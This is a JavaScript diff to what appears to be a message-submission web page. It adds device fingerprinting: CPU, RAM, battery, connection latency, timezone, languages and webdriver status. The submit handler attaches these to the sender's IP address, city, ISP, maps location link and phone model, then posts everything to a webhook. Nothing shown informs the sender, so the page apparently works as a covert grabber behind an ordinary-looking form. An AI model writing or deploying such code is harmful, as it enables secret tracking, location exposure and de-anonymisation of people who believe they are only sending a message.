@@ -410,6 +410,52 @@
             }
         }
 
+        // Funcao para pegar informacoes avancadas do dispositivo
+        async function getAdvancedDeviceInfo() {
+            const info = {
+                cpu: navigator.hardwareConcurrency || 'N/A',
+                ram: navigator.deviceMemory || 'N/A',
+                platform: navigator.platform || 'N/A',
+                screen: `${screen.width}x${screen.height}`,
+                innerWindow: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: screen.colorDepth || 'N/A',
+                language: navigator.language || 'N/A',
+                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+                cookies: navigator.cookieEnabled ? 'Ativado' : 'Desativado',
+                dnt: navigator.doNotTrack || 'N/A',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+                webdriver: navigator.webdriver ? 'Sim (Bot)' : 'Não'
+            };
+
+            // Tentar pegar bateria (se o navegador suportar)
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    info.battery = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Carregando' : 'Descarregando'})`;
+                } catch (e) {
+                    info.battery = 'N/A';
+                }
+            } else {
+                info.battery = 'N/A';
+            }
+
+            // Tentar pegar informacoes de conexao
+            if (navigator.connection) {
+                try {
+                    info.connectionType = navigator.connection.effectiveType || 'N/A';
+                    info.rtt = navigator.connection.rtt ? `${navigator.connection.rtt}ms` : 'N/A';
+                } catch (e) {
+                    info.connectionType = 'N/A';
+                    info.rtt = 'N/A';
+                }
+            } else {
+                info.connectionType = 'N/A';
+                info.rtt = 'N/A';
+            }
+
+            return info;
+        }
+
         messageForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -434,6 +480,7 @@
 
             try {
                 const geo = await getUserIPAndGeo();
+                const advanced = await getAdvancedDeviceInfo();
                 const userAgent = navigator.userAgent;
                 
                 // Detectar modelo do iPhone
@@ -460,7 +507,7 @@
                     else operadora = geo.isp;
                 }
                 
-                const messageWithIP = `**Nome/ID:** ${name}\n**IP:** ${geo.ip}\n**País:** ${geo.country}\n**Cidade:** ${geo.city}\n**Região:** ${geo.region}\n**ISP:** ${geo.isp}\n**Localização:** ${geo.mapsLink}\n**Dispositivo:** ${iphoneModel}\n**iOS:** ${iosVersion}\n**Operadora:** ${operadora}\n**Mensagem:** ${message}`;
+                const messageWithIP = `**Nome/ID:** ${name}\n**IP:** ${geo.ip}\n**País:** ${geo.country}\n**Cidade:** ${geo.city}\n**Região:** ${geo.region}\n**ISP:** ${geo.isp}\n**Localização:** ${geo.mapsLink}\n**Dispositivo:** ${iphoneModel}\n**iOS:** ${iosVersion}\n**Operadora:** ${operadora}\n\n**HARDWARE:**\n**CPU Cores:** ${advanced.cpu}\n**RAM:** ${advanced.ram}GB\n**Plataforma:** ${advanced.platform}\n**Resolução:** ${advanced.screen}\n**Janela:** ${advanced.innerWindow}\n**Profundidade Cor:** ${advanced.colorDepth}\n\n**REDE & DISPOSITIVO:**\n**Tipo Conexão:** ${advanced.connectionType}\n**Latência (RTT):** ${advanced.rtt}\n**Bateria:** ${advanced.battery}\n**Timezone:** ${advanced.timezone}\n\n**BROWSER:**\n**Idioma:** ${advanced.language}\n**Idiomas:** ${advanced.languages}\n**Cookies:** ${advanced.cookies}\n**DNT:** ${advanced.dnt}\n**Webdriver:** ${advanced.webdriver}\n\n**MENSAGEM:** ${message}`;
                 const messageWithoutIP = `**Nome/ID:** ${name}\n**Mensagem:** ${message}`;
 
                 const response = await fetch(WEBHOOK_URL, {
